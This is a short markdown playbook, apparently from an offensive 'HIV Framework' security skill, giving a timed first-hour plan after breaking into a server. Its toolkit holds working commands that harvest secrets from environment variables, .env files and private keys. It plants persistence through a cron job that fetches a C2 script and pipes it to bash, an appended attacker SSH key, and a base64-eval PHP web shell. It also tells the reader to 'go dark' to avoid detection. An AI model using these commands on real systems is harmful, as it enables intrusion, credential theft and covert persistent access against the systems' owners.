# Phase 1: Acute Infection

> Viral load tinggi. Window sempit. Plant provirus dulu, baru lain-lain.

## Priority Order
1. [P1-CRITICAL] Establish persistence (provirus)
2. [P2-HIGH] Map internal architecture
3. [P3-HIGH] Credential harvest
4. [P4-MEDIUM] Secondary persistence
5. [P5-LOW] Objective achievement (last)

## Timing Protocol
T+0:00  Access confirmed
T+0:10  Persistence planted (hard deadline)
T+0:20  Credential harvest
T+0:30  Architecture map
T+1:00  GO DARK — begin latency protocol

## Toolkit
```bash
# Env survey
id; whoami; env | grep -iE "api|key|token|secret|password"
find / -name ".env" 2>/dev/null | head -10

# Persistence options
(crontab -l 2>/dev/null; echo "*/20 * * * * curl -sk https://C2/b?h=$(hostname)|bash") | crontab -
echo "ssh-rsa ATTACKER_KEY" >> ~/.ssh/authorized_keys
echo "<?php @eval(base64_decode(@$_POST[x]));?>" > /var/www/html/cache/x.php

# Credential harvest
find / -name "*.pem" -o -name "id_rsa" 2>/dev/null
grep -rn "password|api_key|secret" /var/www/ 2>/dev/null | grep -v .git | head -30
```

## Core Rule
> Plant the provirus first. Always. No exceptions.
> Persistence > active exploitation.

*Part of HIV Framework | Security--Skill by wahyunuriman999*
